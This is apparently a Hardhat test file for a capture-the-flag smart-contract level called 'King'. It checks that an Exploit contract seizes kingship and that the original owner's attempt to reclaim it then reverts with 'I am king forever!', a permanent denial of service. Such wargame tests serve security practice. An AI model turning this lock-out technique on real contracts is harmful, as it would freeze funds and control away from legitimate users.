import { expect } from 'chai';
import { ethers } from 'hardhat';
import { King, Exploit } from '../typechain-types';

describe('King', function () {
  let king: King;
  let exploit: Exploit;

  async function deploy() {
    const [, hacker] = await ethers.getSigners();
    const KingFactory = await ethers.getContractFactory('King');
    king = await KingFactory.deploy();
    const ExploitFactory = await ethers.getContractFactory('Exploit');
    exploit = await ExploitFactory.connect(hacker).deploy();
  }

  before(deploy);

  it('deployer should be the king', async () => {
    const [deployer] = await ethers.getSigners();
    expect(await king.owner()).to.equal(deployer.address);
    expect(await king._king()).to.equal(deployer.address);
  });

  it('Exploit should seize the kingship', async () => {
    const [, hacker] = await ethers.getSigners();
    const newPrize = (await king.prize()).add(1);
    const tx = await exploit
      .connect(hacker)
      .seizeKingship(king.address, { value: newPrize });
    await tx.wait();
    expect(await king._king()).to.equal(exploit.address);
  });

  it('noone else is able to reclaim kingship', async () => {
    const [deployer] = await ethers.getSigners();
    const newPrize = (await king.prize()).add(1);
    const tx = deployer.sendTransaction({
      to: king.address,
      value: newPrize,
      gasLimit: '40000',
    });
    await expect(tx).to.be.revertedWith('I am king forever!');
  });
});
